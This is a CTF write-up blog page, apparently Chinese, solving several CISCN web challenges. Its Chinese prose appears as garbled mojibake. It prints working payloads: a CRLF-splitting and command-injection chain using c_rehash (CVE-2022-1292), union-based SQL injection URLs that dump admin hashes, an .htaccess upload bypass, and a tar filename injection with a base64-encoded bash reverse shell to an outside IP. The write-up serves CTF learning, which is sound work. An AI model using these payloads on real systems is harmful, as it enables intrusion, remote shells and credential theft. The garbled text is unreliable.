class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> cryptography <span class="keyword">import</span> x509</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.backends <span class="keyword">import</span> default_backend</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives <span class="keyword">import</span> hashes, serialization</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.asymmetric <span class="keyword">import</span> rsa</span><br><span class="line"><span class="keyword">from</span> cryptography.x509.oid <span class="keyword">import</span> NameOID</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_crt</span>(<span class="params">Country, Province, City, OrganizationalName, CommonName, EmailAddress</span>):</span><br><span class="line">    root_key = rsa.generate_private_key(</span><br><span class="line">        public_exponent=<span class="number">65537</span>,</span><br><span class="line">        key_size=<span class="number">2048</span>,</span><br><span class="line">        backend=default_backend()</span><br><span class="line">    )</span><br><span class="line">    subject = issuer = x509.Name([</span><br><span class="line">        x509.NameAttribute(NameOID.COUNTRY_NAME, Country),</span><br><span class="line">        x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, Province),</span><br><span class="line">        x509.NameAttribute(NameOID.LOCALITY_NAME, City),</span><br><span class="line">        x509.NameAttribute(NameOID.ORGANIZATION_NAME, OrganizationalName),</span><br><span class="line">        x509.NameAttribute(NameOID.COMMON_NAME, CommonName),</span><br><span class="line">        x509.NameAttribute(NameOID.EMAIL_ADDRESS, EmailAddress),</span><br><span class="line">    ])</span><br><span class="line">    root_cert = x509.CertificateBuilder().subject_name(</span><br><span class="line">        subject</span><br><span class="line">    ).issuer_name(</span><br><span class="line">        issuer</span><br><span class="line">    ).public_key(</span><br><span class="line">        root_key.public_key()</span><br><span class="line">    ).serial_number(</span><br><span class="line">        x509.random_serial_number()</span><br><span class="line">    ).not_valid_before(</span><br><span class="line">        datetime.datetime.utcnow()</span><br><span class="line">    ).not_valid_after(</span><br><span class="line">        datetime.datetime.utcnow() + datetime.timedelta(days=<span class="number">3650</span>)</span><br><span class="line">    ).sign(root_key, hashes.SHA256(), default_backend())</span><br><span class="line">    crt_name = <span class="string">&quot;static/crt/&quot;</span> + <span class="built_in">str</span>(uuid.uuid4()) + <span class="string">&quot;.crt&quot;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(crt_name, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(root_cert.public_bytes(serialization.Encoding.PEM))</span><br><span class="line">    <span class="keyword">return</span> crt_name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/getcrt&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    Country = request.form.get(<span class="string">&quot;Country&quot;</span>, <span class="string">&quot;CN&quot;</span>)</span><br><span class="line">    Province = request.form.get(<span class="string">&quot;Province&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">    City = request.form.get(<span class="string">&quot;City&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">    OrganizationalName = request.form.get(<span class="string">&quot;OrganizationalName&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">    CommonName = request.form.get(<span class="string">&quot;CommonName&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">    EmailAddress = request.form.get(<span class="string">&quot;EmailAddress&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> get_crt(Country, Province, City, OrganizationalName, CommonName, EmailAddress)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/createlink&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">info</span>():</span><br><span class="line">    json_data = &#123;<span class="string">&quot;info&quot;</span>: os.popen(<span class="string">&quot;c_rehash static/crt/ &amp;&amp; ls static/crt/&quot;</span>).read()&#125;</span><br><span class="line">    <span class="keyword">return</span> json.dumps(json_data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/proxy&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">proxy</span>():</span><br><span class="line">    uri = request.form.get(<span class="string">&quot;uri&quot;</span>, <span class="string">&quot;/&quot;</span>)</span><br><span class="line">    client = socket.socket()</span><br><span class="line">    client.connect((<span class="string">&#x27;localhost&#x27;</span>, <span class="number">8887</span>))</span><br><span class="line">    msg = <span class="string">f&#x27;&#x27;&#x27;GET <span class="subst">&#123;uri&#125;</span> HTTP/1.1</span></span><br><span class="line"><span class="string">Host: test_api_host</span></span><br><span class="line"><span class="string">User-Agent: Guest</span></span><br><span class="line"><span class="string">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="string">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">    client.send(msg.encode())</span><br><span class="line">    data = client.recv(<span class="number">2048</span>)</span><br><span class="line">    client.close()</span><br><span class="line">    <span class="keyword">return</span> data.decode()</span><br><span class="line"></span><br><span class="line">app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">8888</span>)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæœ‰ä¸‰æ¡è·¯ç”±:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/getcrt : åˆ›å»ºä¸€ä¸ªcrtè¯ä¹¦, å¹¶å›æ˜¾æ–‡ä»¶å</span><br><span class="line">/createlink : ä½¿ç”¨c_rehashå‘½ä»¤ä¸ºåˆ›å»ºçš„è¯ä¹¦å»ºç«‹ç¬¦å·é“¾æ¥,  è¿™é‡Œä¹Ÿå°±ä¸Šé¢æåˆ°çš„cveå‘½ä»¤å…³è”äº†</span><br><span class="line">/proxy : å‘æœåŠ¡å™¨æœ¬åœ°çš„8887ç«¯å£å‘é€getè¯·æ±‚, è¿™é‡Œå¾ˆå®¹æ˜“çœ‹å‡ºæ¥æ˜¯æœ‰CRLFå“åº”æ‹†åˆ†æ¼æ´</span><br></pre></td></tr></table></figure><p>å…³äºå“åº”æ‹†åˆ†</p><p><a href="https://xz.aliyun.com/t/9707">https://xz.aliyun.com/t/9707</a></p><p>å†çœ‹æœåŠ¡å™¨æœ¬åœ°è¿è¡Œçš„go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line"><span class="string">&quot;strings&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">admin</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">staticPath := <span class="string">&quot;/app/static/crt/&quot;</span></span><br><span class="line">oldname := c.DefaultQuery(<span class="string">&quot;oldname&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">newname := c.DefaultQuery(<span class="string">&quot;newname&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> oldname == <span class="string">&quot;&quot;</span> || newname == <span class="string">&quot;&quot;</span> || strings.Contains(oldname, <span class="string">&quot;..&quot;</span>) || strings.Contains(newname, <span class="string">&quot;..&quot;</span>) &#123;</span><br><span class="line">c.String(<span class="number">500</span>, <span class="string">&quot;error&quot;</span>) </span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> c.Request.URL.RawPath != <span class="string">&quot;&quot;</span> &amp;&amp; c.Request.Host == <span class="string">&quot;admin&quot;</span> &#123;</span><br><span class="line">err := os.Rename(staticPath+oldname, staticPath+newname)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">c.String(<span class="number">200</span>, newname)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">c.String(<span class="number">200</span>, <span class="string">&quot;no&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">index</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">c.String(<span class="number">200</span>, <span class="string">&quot;hello world&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">router := gin.Default()</span><br><span class="line">router.GET(<span class="string">&quot;/&quot;</span>, index)</span><br><span class="line">router.GET(<span class="string">&quot;/admin/rename&quot;</span>, admin)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> err := router.Run(<span class="string">&quot;:8887&quot;</span>); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¾ˆå®¹æ˜“å‘ç°&#x2F;admin&#x2F;renameè¿™æ¡è·¯ç”±æ˜¯æ›´æ”¹æˆ‘ä»¬åˆ›å»ºçš„è¯ä¹¦æ–‡ä»¶çš„æ–‡ä»¶å</p><p>ä¸ä¸Šé¢pythonçš„&#x2F;createlinkè·¯ç”±çš„åŠŸèƒ½ç›¸ç»“åˆå°±é€ æˆäº†CVE-2022-1292çš„åˆ©ç”¨ç‚¹</p><p>é¦–å…ˆåˆ›å»ºä¸€ä¸ªè¯ä¹¦å¹¶æ‹¿æ¥æ–‡ä»¶å</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240312155735785.png" alt="image-20240312155735785"></p><p>ä¹‹åssrfåŠ å“åº”æ‹†åˆ†æ”¹æ–‡ä»¶å, è¿™é‡Œä¼šè¸©å‘,adminåçš„<code>/</code>å¿…é¡»urlç¼–ç , å¿…é¡»ç”¨form-dataå‘åŒ…, ä¸ç„¶æ²¡æœ‰<code>\r\n</code></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240312180041150.png" alt="image-20240312180041150"></p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/admin%2frename?oldname=7463b49b-69c6-49f5-8f3d-0d0f97161381.crt&amp;newname=`echo$&#123;IFS&#125;1$&#123;IFS&#125;&gt;a`.crt HTTP/1.1</span><br><span class="line">Host: admin</span><br><span class="line"></span><br><span class="line">GET /</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240312180125110.png" alt="image-20240312180125110"></p><p>å¯ä»¥å‘ç°æˆåŠŸå†™å…¥</p><p>ä½†æ˜¯è¿™é‡Œæ–‡ä»¶åä¸èƒ½åŒ…å«<code>/</code>, ç¨å¾®ç»•è¿‡ä¸€ä¸‹</p><p>è¿™é‡Œè¯•äº†å¾ˆå¤šæ¬¡base64æ¥ç»•è¿‡ä½†æ˜¯æ²¡æœ‰æˆåŠŸ</p><p>ä¹‹åæ˜¯å°è¯•${PATH:0:1}æ¥ç»•è¿‡, ä¹Ÿæ²¡æˆåŠŸ,</p><p>æœ‰è¯´ç”¨${OLDPWD}çš„, è¿™ä¸ªå˜é‡æ˜¯è¡¨ç¤ºå½“å‰ç›®å½•,è¿™é‡Œä¹Ÿä¸æ˜¯<code>/</code></p><p>æœ€åè¿˜æ˜¯base64ç»•è¿‡, base64çš„å†…å®¹æ˜¯cat &#x2F;*</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/admin%2frename?oldname=07fc2723-258b-4873-9011-e2df6a4041e6.crt&amp;newname=`echo$&#123;IFS&#125;Y2F0IC8qIA==|base64$&#123;IFS&#125;--decode|bash&gt;flag.txt`.crt HTTP/1.1</span><br><span class="line">Host: admin</span><br><span class="line"></span><br><span class="line">GET /</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240312223845842.png" alt="image-20240312223845842"></p><h2 id="CISCN-2019åä¸œå—-Double-Secret"><a href="#CISCN-2019åä¸œå—-Double-Secret" class="headerlink" title="[CISCN 2019åä¸œå—]Double Secret"></a>[CISCN 2019åä¸œå—]Double Secret</h2><p>app.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">secret=request.args.get(<span class="string">&#x27;secret&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> secret <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Tell me your secret. I will encrypt it so others can\&#x27;t see&#x27;</span></span><br><span class="line"></span><br><span class="line">rc = rc4_Modified.RC4(<span class="string">&quot;HereIsTreasure&quot;</span>)  <span class="comment"># è§£å¯†</span></span><br><span class="line">deS = rc.do_crypt(secret)</span><br><span class="line"></span><br><span class="line">a = render_template_string(safe(deS))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;ciscn&#x27;</span> <span class="keyword">in</span> a.lower():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;flag detected!&#x27;</span></span><br><span class="line"><span class="keyword">return</span> a</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>rc4_Modified.RC4.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">r = (self.Box[self.index_i] + self.Box[self.index_j]) % <span class="number">256</span></span><br><span class="line">R = self.Box[r]  <span class="comment"># ç”Ÿæˆä¼ªéšæœºæ•°</span></span><br><span class="line">tmp = <span class="built_in">ord</span>(s) ^ R</span><br><span class="line">test.append(tmp)</span><br><span class="line">out.append(<span class="built_in">chr</span>(tmp))</span><br><span class="line"><span class="comment"># print(test)</span></span><br><span class="line"><span class="comment"># print(len(test))</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(out)</span><br></pre></td></tr></table></figure><h2 id="CISCN-2023-è¥¿å—-do-you-like-read"><a href="#CISCN-2023-è¥¿å—-do-you-like-read" class="headerlink" title="[CISCN 2023 è¥¿å—]do_you_like_read"></a>[CISCN 2023 è¥¿å—]do_you_like_read</h2><p>è¿›å»å°±èƒ½æ‰¾åˆ°ä¸€ä¸ªæ³¨å…¥ç‚¹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:28771/book.php?bookisbn=-1%27union%20select%20database(),2,3,4,5,6,7,8--+</span><br></pre></td></tr></table></figure><p>obs_db</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:28771/book.php</span><br><span class="line">?bookisbn=-1&#x27;union select group_concat(table_name),2,3,4,5,6,7,8 from information_schema.tables where table_schema=&#x27;obs_db&#x27;--+</span><br></pre></td></tr></table></figure><p>admin,books,customers,order_items,orders,publisher</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:28771/book.php</span><br><span class="line">?bookisbn=-1&#x27;union select group_concat(column_name),2,3,4,5,6,7,8 from information_schema.columns where table_name=&#x27;admin&#x27;--+</span><br></pre></td></tr></table></figure><p>name,pass</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:28771/book.php</span><br><span class="line">?bookisbn=-1&#x27;union select group_concat(name,pass),2,3,4,5,6,7,8 from obs_db.admin--+</span><br></pre></td></tr></table></figure><p>adminf865b53623b121fd34ee5426c792e5c33af8c227</p><p>è¿™é‡Œæ‹¿åˆ°äº†adminå¯†ç çš„å“ˆå¸Œå€¼</p><p>æ‰”åˆ°è§£å¯†ç½‘ç«™è·‘ä¸€ä¸‹, ç›´æ¥å‡ºå¯†ç </p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240313102458081.png" alt="image-20240313102458081"></p><p>ç™»å½•ä¸Šå»å¯ä»¥çœ‹è§æ˜¯æœ‰ä¸Šä¼ ç‚¹</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240313102719572.png" alt="image-20240313102719572"></p><p>å°è¯•ä¼ ä¸€ä¸ªphp, å‘ç°è‡ªåŠ¨è¢«æ”¹æˆäº†.jpg</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240313103055789.png" alt="image-20240313103055789"></p><p>å°è¯•ä¼ .htaccess</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240313104133868.png" alt="image-20240313104133868"></p><p>è®¿é—®ä¹‹å‰è¢«æ”¹äº†åç¼€çš„ğŸ</p><p>æˆåŠŸè§£æ</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240313104212524.png" alt="image-20240313104212524"></p><p>çœ‹äº†ä¸‹é¢˜è§£, è¿™å¥½åƒæ˜¯éé¢„æœŸ</p><h2 id="CISCN-2019ååŒ—Day1-Web2"><a href="#CISCN-2019ååŒ—Day1-Web2" class="headerlink" title="[CISCN 2019ååŒ—Day1]Web2"></a>[CISCN 2019ååŒ—Day1]Web2</h2><h2 id="CISCN-2023-ååŒ—-pysym"><a href="#CISCN-2023-ååŒ—-pysym" class="headerlink" title="[CISCN 2023 ååŒ—]pysym"></a>[CISCN 2023 ååŒ—]pysym</h2><p>app.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, send_from_directory</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>]=<span class="string">&#x27;uploads&#x27;</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">POST</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;No file uploaded.&#x27;</span></span><br><span class="line">    file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> file.content_length &gt; <span class="number">10240</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;file too lager&#x27;</span></span><br><span class="line">    path = <span class="string">&#x27;&#x27;</span>.join(random.choices(string.hexdigits, k=<span class="number">16</span>))</span><br><span class="line">    directory = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], path)</span><br><span class="line">    os.makedirs(directory, mode=<span class="number">0o755</span>, exist_ok=<span class="literal">True</span>)</span><br><span class="line">    savepath=os.path.join(directory, file.filename)</span><br><span class="line">    file.save(savepath)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">     os.system(<span class="string">&#x27;tar --absolute-names  -xvf &#123;&#125; -C &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(savepath,directory))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;something wrong in extracting&#x27;</span></span><br><span class="line"></span><br><span class="line">    links = []</span><br><span class="line">    <span class="keyword">for</span> root, dirs, files <span class="keyword">in</span> os.walk(directory):</span><br><span class="line">        <span class="keyword">for</span> name <span class="keyword">in</span> files:</span><br><span class="line">            extractedfile =os.path.join(root, name)</span><br><span class="line">            <span class="keyword">if</span> os.path.islink(extractedfile):</span><br><span class="line">                os.remove(extractedfile)</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;no symlink&#x27;</span></span><br><span class="line">            <span class="keyword">if</span>  os.path.isdir(path) :</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;no directory&#x27;</span></span><br><span class="line">            links.append(extractedfile)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>,links=links)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/uploads/&lt;path:path&gt;&quot;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download</span>(<span class="params">path</span>):</span><br><span class="line">    filepath = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], path)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.isfile(filepath):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;404&#x27;</span>, <span class="number">404</span></span><br><span class="line">    <span class="keyword">return</span> send_from_directory(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], path)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">1337</span>)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæœ‰ä¸€ä¸ªå¾ˆæ˜æ˜¾çš„å‘½ä»¤æ³¨å…¥, ç”¨sleepæµ‹ä¸€ä¸‹å‘ç°çš„ç¡®å¯ä»¥æ³¨å…¥,</p><p>ç›´æ¥å¼¹ä¸ªshellå›æ¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=&quot;a.tar;echo$&#123;IFS&#125;YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDcuMTQ4Ljc1LjIwMi8xMjM0IDA+JjE=|base64$&#123;IFS&#125;--decode|bash;&quot;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240313114927363.png" alt="image-20240313114927363"></p><h2 id="CISCN-2019ååŒ—Day1-Web1"><a href="#CISCN-2019ååŒ—Day1-Web1" class="headerlink" title="[CISCN 2019ååŒ—Day1]Web1"></a>[CISCN 2019ååŒ—Day1]Web1</h2><p>æ³¨å†Œç™»å½•åæœ‰ä¸Šä¼ æ–‡ä»¶</p><p>åœ¨æ–‡ä»¶ä¸‹è½½çš„åœ°æ–¹å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–</p><p>å…³é”®æ–‡ä»¶ class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span 